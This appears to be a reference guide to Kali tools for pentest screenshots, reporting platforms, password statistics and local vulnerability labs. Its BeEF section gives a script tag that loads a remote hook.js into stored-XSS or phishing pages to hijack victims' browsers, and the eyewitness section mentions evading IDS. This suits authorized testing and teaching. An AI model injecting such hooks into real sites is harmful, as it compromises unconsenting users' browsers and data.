# Reporting, Collaboration & Labs

> **When to read this file**: Read this file when a task involves pentest evidence screenshots, reporting/collaboration platforms, password dump statistical analysis, setting up local vulnerability labs (DVWA/Juice Shop), or starting/stopping platform services such as GVM/BeEF/TheHive.

## Quick Decision Table

| Task scenario | Primary tool | Alternative | Key difference |
|---|---|---|---|
| Bulk website screenshots + HTML report | eyewitness | witnessme | EyeWitness produces a report with a single command; WitnessMe adds signature scanning/REST API/interactive result database |
| Quick screenshot of a single URL (PNG/PDF/SVG) | cutycapt | `eyewitness --single` | cutycapt is Qt WebKit based and needs no browser; renders modern JS-heavy pages less well than Selenium-based tools |
| Large-scale network segment inventory (CIDR/IP ranges/Nessus) | witnessme | `eyewitness -x` | WitnessMe natively accepts CIDR/IP ranges/.nessus and scans 80/8080/443/8443 by default |
| Collaborative team pentest reporting | dradis | defectdojo / redeye | Dradis is lightweight and focused on report templates and collaboration; DefectDojo leans toward vulnerability management and deduplication; RedEye leans toward red team operation data management |
| Vulnerability management platform (dedup/JIRA/Slack push) | defectdojo | thehive | DefectDojo leans toward an AppSec vulnerability repository; TheHive leans toward security incident response (case management) |
| Comprehensive vulnerability scanning platform (formerly OpenVAS) | gvm | — | `gvm-setup` for first-time initialization (feed download is time-consuming), then start/stop |
| Browser exploitation/client-side attack framework | beef-xss | — | Inject hook.js into pages to take control; the panel on port 3000 manages hooked browsers |
| Password dump statistical analysis | pipal | — | Statistics only, no cracking; top passwords/base words/length distribution directly guide wordlist generation |
| Local web lab (PHP classic vulnerabilities, difficulty levels) | dvwa | — | Port 42001, admin/password, covers SQLi/XSS/command injection and more |
| Local web lab (Node, OWASP Top 10+) | juice-shop | — | Port 42000, zero-config out of the box |
| Hierarchical notes/forensic information organization | cherrytree | obsidian | CherryTree is a single encryptable file suited to project notes; Obsidian's Markdown ecosystem suits long-term knowledge bases |
| Desktop operation screen recording for evidence | recordmydesktop | — | Outputs Ogg Theora; pair with ffmpeg to convert to mp4 |
| Command cheat sheet with one-click copy | arsenal-ng | — | TUI to search 2800+ preset pentest commands, with variable substitution |

### Platform service port quick reference (all Kali-packaged, listening on 127.0.0.1)

| Service | Start | Stop | Address | Default credentials |
|---|---|---|---|---|
| dradis | `sudo dradis-start` | `sudo dradis-stop` | http://127.0.0.1:3000 | Set up following terminal prompts on first start |
| defectdojo | `sudo defectdojo-start` | `sudo defectdojo-stop` | http://127.0.0.1:42003 | admin + a randomly generated password on first start (shown in the terminal only once) |
| gvm (Greenbone) | `sudo gvm-start` | `sudo gvm-stop` | https://127.0.0.1:9392 | Create the admin account on first Web UI visit |
| beef-xss | `sudo beef-xss` | `sudo beef-xss-stop` | http://127.0.0.1:3000/ui/panel | beef / forced password change on first start |
| thehive | `sudo thehive-start` | `sudo thehive-stop` | http://127.0.0.1:9000 | admin / secret |
| dvwa | `sudo dvwa-start` | `sudo dvwa-stop` | http://127.0.0.1:42001/login.php | admin / password |
| juice-shop | `sudo juice-shop` | `sudo juice-shop-stop` | http://127.0.0.1:42000 | No login required |
| redeye | `sudo redeye-start` | `sudo redeye-stop` | http://127.0.0.1:8443 | Set up on first use |

Note: dradis and beef-xss both use port 3000 by default; stagger them when running on the same host (stop one first, or change the BeEF configuration).

## Core Tools in Depth

### eyewitness — Bulk website screenshots and rapid triage

**Purpose**: Takes bulk screenshots of URL lists / Nmap XML / Nessus files, captures server headers and page titles, identifies known applications and default credentials via built-in signatures, and generates an HTML report.
**Installation**: `sudo apt install eyewitness`
**When to use**: In late reconnaissance, the top choice when facing dozens to hundreds of web services and needing to quickly pick out login pages, admin panels, and outdated components; simpler and more direct than witnessme.

```bash
# 对 URL 列表截图并生成 HTML 报告(--no-prompt 避免交互提问)
eyewitness --web -f urls.txt -d <output-dir> --no-prompt

# 直接读取 Nmap XML 或 Nessus 扫描结果(按文件内容自动识别)
eyewitness --web -x nmap-scan.xml -d <output-dir> --no-prompt

# 单个目标
eyewitness --web --single http://<ip>:8080 --no-prompt

# 慢速目标:加大超时与重试、限制线程
eyewitness --web -f urls.txt --timeout 15 --max-retries 2 --threads 10 -d <output-dir>

# 所有截图流量走代理(结合 Burp 联动)
eyewitness --web -f urls.txt --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type http

# 中断后从断点恢复
eyewitness --web --resume ew.db

# 自定义 UA / 附加 Cookie(访问需登录态的页面)
eyewitness --web -f urls.txt --user-agent "<ua-string>" --cookies key1=value1,key2=value2
```

**Practical tips**:
- In the Kali-packaged version, if the output directory `-d` uses a relative path, the report lands under `/usr/share/eyewitness/`; always use an absolute path.
- `-f` input auto-detects three formats: plain text with one URL per line, Nmap XML (`-x`), and Nessus XML (`-x`); for IP range targets, witnessme is a better fit.
- The report is `report.html` (with screenshots, titles, server headers, default credential hints); sorting by page difference quickly surfaces default pages that "look alike".
- `--jitter` randomizes request order and adds random delays, reducing IDS triggers on the target side.

### cutycapt — Single-page rendered screenshots (no browser dependency)

**Purpose**: Renders web pages via Qt WebKit and saves them as PNG/JPEG/PDF/SVG/PS/TIFF/GIF/BMP; lightweight and runs without a GUI.
**Installation**: `sudo apt install cutycapt`
**When to use**: When you only need to document a few URLs as evidence (e.g., vulnerability page screenshots for a report) and spinning up a Selenium stack is not worth it; the only choice when you need vector formats (PDF/SVG) embedded in reports.

```bash
# 基本截图(官网示例)
cutycapt --url=http://<domain> --out=<file>.png

# 指定最小视口与最长等待时间
cutycapt --url=http://<ip>:8080 --out=app.png --min-width=1280 --min-height=800 --max-wait=15000

# 直接输出 PDF
cutycapt --url=https://<domain> --out=page.pdf

# 无显示环境的机器用 xvfb-run 包裹
xvfb-run --server-args="-screen 0, 1280x800x24" cutycapt --url=http://<domain> --out=<file>.png
```

**Practical tips**:
- The output format is determined by the extension of `--out`; no extra parameter needed.
- The rendering engine is Qt WebKit, which is dated; modern SPA/JS-heavy pages may not render fully — switch to eyewitness for such targets.
- `--delay=<ms>` waits before the screenshot, useful for skipping loading animations; `--user-agent=` and `--http-proxy=<url>` support customized requests (e.g., `cutycapt --url=http://<domain> --out=<file>.png --http-proxy=http://127.0.0.1:8080`).

### witnessme — Large-scale web asset inventory and grabbing

**Purpose**: A web inventory tool based on headless Chromium (pyppeteer); supports mixed input of CIDR/IP ranges/Nessus/Nmap XML. After screenshotting, results can be browsed interactively with wmdb, signature-scanned, and exported as HTML/CSV reports; also provides a REST API (wmapi).
**Installation**: `sudo apt install witnessme`
**When to use**: After scanning large internal network segments, when you need a panoramic view of "which hosts run web services and what applications they are"; or when you need to grab content from JS-rendered pages via XPath.

```bash
# 混合输入:CIDR + IP 段 + URL + 文件(IP/CIDR 默认尝试 80/8080/443/8443)
witnessme screenshot 192.168.1.0/24 192.168.1.10-20 https://<domain> targets.txt

# 自定义端口
witnessme screenshot -p 80 8080 443 8443 10.0.0.0/24

# 从 stdin 读目标
cat urls.txt | witnessme screenshot -

# 渲染 JS 页面后按 XPath 抓取内容
witnessme grab -x '//div[@id="dns"]/table//tr/td[2]/a/text()' https://<domain>/path

# 抓取页面全部链接
witnessme grab -l https://<domain>

# 全部流量走 HTTP 代理
HTTP_PROXY=http://127.0.0.1:8080 witnessme screenshot targets.txt

# 扫描完成后在当前目录生成 scan_<时间戳>/ 目录,用 wmdb 浏览结果
wmdb scan_<timestamp>/
#   wmdb 内: servers tomcat     # 按 server/title 过滤服务
#   wmdb 内: hosts <ip>         # 查看主机及其服务
#   wmdb 内: scan               # 对全部服务跑签名扫描
#   wmdb 内: generate_report html   # 生成 HTML 报告(csv 可选)
```

**Practical tips**:
- Nmap XML must end in `.xml` and Nessus files must have the `.nessus` extension, or they are parsed as plain text.
- `--threads` defaults to 15 with one browser tab per thread; raising it too high exhausts memory and causes Page Crashes.
- `wmapi [host] [port]` exposes the scanning capability as a REST API (default 127.0.0.1:8000, docs at /docs) with no authentication whatsoever — never make it listen externally.
- Signatures are YAML files (application fingerprints + default credentials); you can add your own detection rules.

### pipal — Password dump statistical analysis

**Purpose**: Runs statistics on password files (cracking results or wordlists): total/unique counts, top passwords, top base words, length distribution, and character composition ratios, providing a basis for the next round of wordlist generation and password policy assessment.
**Installation**: `sudo apt install pipal`
**When to use**: After obtaining a batch of cracked plaintext passwords (hashcat/john output) to quantitatively analyze password patterns; or to assess password strength in a client environment for the report.

```bash
# 分析文件并显示 top 5(官网示例,输入为 Kali 自带字典)
pipal -t 5 /usr/share/wordlists/nmap.lst

# 分析破解结果,显示 top 20,结果落盘
pipal -t 20 cracked.txt -o pipal-report.txt

# 查看可用的分析器及其启用状态
pipal --list-checkers

# 详细输出
pipal -v <file>
```

**Practical tips**:
- Input is plain text with one password per line; `#!comment:` comment lines in wordlists also get counted (as seen in the official site's output) — filter them out first with `grep -v '^#!'`.
- Large files take time; pressing Ctrl-C during the progress bar ends early and outputs statistics for the portion already processed.
- Focus on "Top base words" (base words) and the length distribution: e.g., 6-8 character passwords at 70% plus base words like love/angel/password ranking high — you can directly derive a `base-word+year` rule for the next hashcat run.
- `--gkey <key>` sets a Google Maps API key for postcode attribution statistics (optional feature).

### dradis — Pentest collaboration and reporting platform

**Purpose**: An open-source collaboration framework: centrally manages each tester's notes, scanner imports (nmap/nessus/nikto plugins), methodology checklists (reusable issue library), and finally applies templates to generate reports with one click.
**Installation**: `sudo apt install dradis`
**When to use**: Multi-person team projects that need shared real-time progress and a unified report format; also sufficient for solo operators who want structured findings management.

```bash
# 启动(首次运行初始化,终端提示设置账号凭据,并自动打开浏览器)
sudo dradis-start
# Web UI: http://127.0.0.1:3000

# 停止
sudo dradis-stop

# 等价的 systemd 操作
sudo systemctl start dradis
sudo systemctl status dradis
```

**Practical tips**:
- The service listens on 127.0.0.1:3000 only; for remote team collaboration use an SSH tunnel: `ssh -L 3000:127.0.0.1:3000 <user>@<server>`.
- Port conflict with beef-xss by default (both use 3000); stop one first on the same host.
- Workflow: create a Project → import scanner results as Evidence → consolidate into Issues (reusable library) → attach to the Methodology checklist → export the report (HTML/Word templates).
- The default credentials are printed in the terminal output on first start; keep them safe.

### defectdojo — Vulnerability management and security orchestration platform

**Purpose**: An application security vulnerability management platform: imports results from all kinds of scanners (100+ parsers), heuristic deduplication and noise reduction, maintains the product/engagement/test object hierarchy, and can push findings to JIRA and Slack.
**Installation**: `sudo apt install defectdojo` (large download; depends on PostgreSQL + Redis + celery)
**When to use**: When you need long-term tracking of the vulnerability lifecycle (from discovery to fix verification), aggregation and dedup of multi-tool results, and integration with development ticketing systems; heavier than dradis but more of a "platform".

```bash
# 首次启动:自动建库、生成 admin 密码(只在终端显示一次,务必记录)
sudo defectdojo-start
# Web UI: http://127.0.0.1:42003  用户名: admin

# 忘记密码时直接建新超级用户
cd /usr/lib/defectdojo && sudo python3 manage.py createsuperuser

# 停止(含 uwsgi 与 celery worker/beat)
sudo defectdojo-stop
```

**Practical tips**:
- The old command `defectdojo` is deprecated by Kali; use `defectdojo-start` consistently.
- Startup pulls up multiple components (postgresql, redis, celery); port 42003 may be unresponsive until initialization finishes, so wait 1-2 minutes before visiting.
- Prefer importing results via the API (scriptable, batch-capable) or the Web UI's Import Scan; automatic dedup of same-type vulnerabilities relies on heuristics, so review the dedupe suggestions manually after import.
- Division of labor with dradis: dradis handles "how the report is written", DefectDojo handles "how vulnerability status flows".

### gvm — Greenbone vulnerability management system (formerly OpenVAS)

**Purpose**: A full open-source vulnerability scanning platform: gvmd (management) + ospd-openvas (scanning) + notus-scanner (local checks) + gsad (web interface); performs credentialed/uncredentialed vulnerability audits of remote hosts.
**Installation**: `sudo apt install gvm` (metapackage)
**When to use**: When you need systematic CVE scanning of an entire network segment and compliance-style vulnerability reports (as opposed to manual verification in penetration testing).

```bash
# 首次使用必须先初始化:建 PostgreSQL 库、生成证书、下载 NVT/feed(数据量大,耗时可能 30 分钟以上)
sudo gvm-setup

# 检查安装完整性(会给出具体修复命令)
sudo gvm-check-setup

# 证书缺失报错时按 check-setup 提示修复
sudo runuser -u _gvm -- gvm-manage-certs -a -f

# 启动/停止全套服务
sudo gvm-start     # Web UI: https://127.0.0.1:9392
sudo gvm-stop
```

**Practical tips**:
- Until `gvm-setup` has finished, the page opened by `gvm-start` cannot be logged into; feed download failures are mostly network issues — rerun setup.
- The Web UI uses a self-signed HTTPS certificate; manually accept the browser warning.
- Create the admin account via the wizard page on first visit to https://127.0.0.1:9392.
- For scan configs, use "Full and fast" first as a baseline; scans with credentials (Credentialed checks) produce far higher-quality results than uncredentialed scans.

### beef-xss — Browser exploitation framework (BeEF)

**Purpose**: Controls victim browsers by injecting hook.js into pages: social engineering popups, internal network probing, information theft, payload delivery; manages hooked browsers and command modules through a panel.
**Installation**: `sudo apt install beef-xss`
**When to use**: Verifying the real impact of XSS, client-side attack drills, and assessing the browser-side attack surface in red team phishing exercises.

```bash
# 启动(首次运行强制把默认密码 beef 改掉,之后自动打开面板)
sudo beef-xss
# Web UI: http://127.0.0.1:3000/ui/panel
# Hook 脚本: http://<your-ip>:3000/hook.js

# 停止
sudo beef-xss-stop

# 修改监听地址/端口/凭据
sudo vi /etc/beef-xss/config.yaml
```

**Practical tips**:
- Hooking: inject `<script src="http://<your-ip>:3000/hook.js"></script>` into a page with stored XSS, or embed it in a phishing page; hooked browsers appear under "Online Browsers" in the panel.
- Victim machines must be able to connect back to the Kali host at IP:3000; an HTTP hook injected into an HTTPS page gets blocked by the browser's mixed-content policy — serve the hook via an HTTPS reverse proxy.
- Port conflict with dradis (both default to 3000); stop one first or change the configuration when deploying on the same host.
- When testing client-side attack chains, start with low-detection command modules (e.g., the Social Engineering series), then escalate gradually.

### dvwa — Damn Vulnerable Web Application lab

**Purpose**: A PHP/MySQL lab "riddled with holes": SQLi, XSS (reflected/stored/DOM), command injection, file upload, CSRF, brute force, file inclusion and other classic vulnerabilities; each module has four difficulty levels from Low to Impossible plus source viewing.
**Installation**: `sudo apt install dvwa` (automatically pulls in apache2/nginx + php + mariadb dependencies)
**When to use**: Practicing manual injection alongside tools, validating scanner effectiveness, and security training; closer to the traditional LAMP stack than juice-shop.

```bash
# 启动(自动拉起 php-fpm、数据库并打开浏览器)
sudo dvwa-start
# Web UI: http://127.0.0.1:42001/login.php  默认 admin / password

# 首次登录后在首页点击 "Create / Reset Database" 初始化数据库,然后重新登录

# 停止
sudo dvwa-stop
```

**Practical tips**:
- Switch Low/Impossible difficulty on the DVWA Security page on the left; PHPIDS can be toggled on/off for testing WAF-style blocking.
- Working with Burp: after pointing the browser proxy at 127.0.0.1:8080, every module (blind SQLi, CSRF token capture) can be exercised.
- Resetting the database wipes all test data; after `dvwa-stop`, lab data persists in mariadb.
- Official warning: never deploy to an internet-facing server; this package listens on local loopback only.

### juice-shop — OWASP Juice Shop lab

**Purpose**: A modern insecure application written in Node.js/Express: covers the OWASP Top 10 plus many real-world vulnerabilities (SQL/NoSQL injection, XSS, privilege escalation, JWT abuse, business logic flaws, etc.), with a built-in scoreboard and hacking instructor; well suited to CTFs and tool experiments.
**Installation**: `sudo apt install juice-shop` (about 1 GB)
**When to use**: Practicing modern web/API attack techniques, a "guinea pig" for new tools, and security awareness demos; zero-config out of the box.

```bash
# 启动
sudo juice-shop
# Web UI: http://127.0.0.1:42000

# 停止
sudo juice-shop-stop
```

**Practical tips**:
- Browse the shop without logging in; the "Score Board" entry at the bottom of the page (or visit /#/score-board) tracks challenge progress.
- Official warning: contains numerous real vulnerabilities; never expose it to the public internet or production environments.
- Pairs well with Burp/nuclei/SQLmap drills: the target is simply http://127.0.0.1:42000.
- Division of labor with dvwa: juice-shop for the modern stack (JSON API/JWT/frontend), dvwa for classic LAMP.

### thehive — Security incident response platform

**Purpose**: A SOC case management platform: aggregates alerts into cases, task assignment, observable analysis, and integration with Cortex/MISP for automated response; Kali packages TheHive 4 (Cassandra backend).
**Installation**: `sudo apt install thehive`
**When to use**: When pentest/red team output needs to be managed as an incident stream, or when building a small SOC lab environment.

```bash
# 首次启动:自动初始化 Cassandra(改集群名为 thp 并重启),非常慢,需数分钟
sudo thehive-start
# Web UI: http://127.0.0.1:9000  默认 admin / secret

# 停止
sudo thehive-stop
```

**Practical tips**:
- Seeing "Please wait..." on first start is normal — it is stuck on cassandra initialization; do not press Ctrl-C midway.
- Default credentials are admin/secret; change them immediately after logging in.
- TheHive 5 has not made it into the Kali repos upstream; the packaged version is 4.1.x; for 5.x, deploy it yourself with the official Docker images.
- Typical integration: thehive receives cases → Cortex runs analyzers → MISP syncs intelligence.

### cherrytree — Hierarchical pentest notes

**Purpose**: A single-document hierarchical note application: rich text + code syntax highlighting + embedded images + hyperlinks; the whole notebook saves as one file (.ctd XML or .cts SQLite), supports whole-notebook password encryption, and exports to PDF/HTML/TEXT.
**Installation**: `sudo apt install cherrytree`
**When to use**: Solo project operation notes, CVE/PoC material organization, credential and host inventory records; use it when you don't want to run a web service just for note-taking — switch to dradis for multi-person collaboration.

```bash
# 启动 GUI,直接打开指定笔记库
cherrytree <file>.ctd
```

**Practical tips**:
- .cts (SQLite) + password encryption suits pentest notes holding sensitive information; remember that backing up the single file backs up everything.
- Organize the node tree as "Recon / Enumeration / Exploitation / Report"; paste commands and outputs into syntax-highlighted nodes — a source of material when writing reports.
- Supports importing from KeepNote, Zim, Tomboy, Evernote and other formats; exported PDFs can be delivered directly as attachments.
- Trade-off versus obsidian: cherrytree is a single-file closed database, obsidian is a plain Markdown folder (git-versionable).

### redeye — Red team operation data management

**Purpose**: Attack data management during pentest/red team operations: hosts, services, credentials, screenshots, and command outputs organized centrally, assisting with operation report generation.
**Installation**: `sudo apt install redeye`
**When to use**: Managing massive C2/scan output during multi-day red team operations, when you need to quickly trace back "which host was reached through which path with which credentials".

```bash
# 启动(浏览器可能需要手动刷新一次)
sudo redeye-start
# Web UI: http://127.0.0.1:8443

# 停止
sudo redeye-stop
```

**Practical tips**:
- The old command `redeye` is deprecated; use `redeye-start` consistently.
- The data model is organized around "campaign → hosts → credentials/attachments" and pairs smoothly with Cobalt Strike-style logs.
- Listens on localhost only; use an SSH tunnel to forward 8443 for remote access.

### recordmydesktop — Desktop screen recording for evidence

**Purpose**: Records Linux desktop sessions as Ogg Theora video (optionally with Vorbis audio); only re-encodes changed regions, so overhead is low.
**Installation**: `sudo apt install recordmydesktop`
**When to use**: Vulnerability reproduction recordings, PoC demos, training videos; a supplement to the evidence chain in pentest reports.

```bash
# 录制全屏(Ctrl+Mod1+p 暂停,Ctrl+Mod1+s 停止并保存)
recordmydesktop -o session.ogv

# 无声音,只录指定矩形区域
recordmydesktop -o demo.ogv --no-sound -x 100 -y 100 --width 1024 --height 768

# 限制帧率 + 即时编码(降低 CPU 与临时盘占用)
recordmydesktop -o demo.ogv --fps 15 --on-the-fly-encoding --no-sound

# 交付前转成 mp4
ffmpeg -i demo.ogv demo.mp4
```

**Practical tips**:
- The default shortcut modifier Mod1 is Alt: Ctrl+Alt+p pauses/resumes, Ctrl+Alt+s stops.
- By default only changed regions are captured; fast full-screen motion (video playback, page scrolling) will blur — add `--full-shots` in that case.
- The ogv format is awkward to play in most client environments; convert to mp4 with ffmpeg before putting it into reports.

### arsenal-ng — Pentest command cheat sheet library (TUI)

**Purpose**: Ships with 2800+ pentest command templates organized by tool (cheat sheets for 200+ tools including 403bypasser, AD-miner); fuzzy search, variable substitution, and one-click copy in the terminal.
**Installation**: `sudo apt install arsenal-ng`
**When to use**: Faster than flipping through man pages when you cannot recall a tool's full parameter combination; also centralizes management of your frequently used payloads.

```bash
# 启动 TUI,键入关键字过滤命令列表
arsenal-ng
#   界面内: set host=10.10.10.10     # 定义变量,命令模板自动替换
#           unset host               # 清除变量
#           variables                # 查看已定义变量
#           ↑/↓ 选择,回车复制到剪贴板,esc 退出
```

**Practical tips**:
- Commands are tagged (bypass/reconnaissance/active-directory, etc.); searching with tag terms is more accurate.
- Copied commands still need manual verification of parameters and target values before execution.
- Essentially a "memory extension"; decoupled from tools like pipal/eyewitness and usable at any stage.

## Remaining Tools — Quick Reference

| Tool | One-line purpose | Package | Most common command |
|---|---|---|---|
| obsidian | Local-first Markdown knowledge base notes (plugin ecosystem) | obsidian | `obsidian` |
| kali-tweaks | Kali system configuration menu (mirror/proxy/metapackage/hardening options) | kali-tweaks | `sudo kali-tweaks` |
| gemini-cli | Gemini AI agent in the terminal (interactive/non-interactive) | gemini-cli | `gemini-cli -p "<prompt>"` (non-interactive mode) |
| shell-gpt | LLM-generated shell commands and code snippets (requires OPENAI_API_KEY) | shell-gpt | `sgpt --shell "<describe the command to run in natural language>"` |
| portspoof | Anti-scan camouflage: all 65535 ports open + dynamic fake banners to confuse scanners | portspoof | `sudo portspoof-start` / `sudo portspoof-stop` (configure per its documentation before use) |
| faraday | Multi-user pentest collaboration/orchestration platform | faraday | `faraday` (similar alternatives: dradis / defectdojo / redeye) |

---

Use only for penetration testing with written authorization, CTF competitions, and security education scenarios.
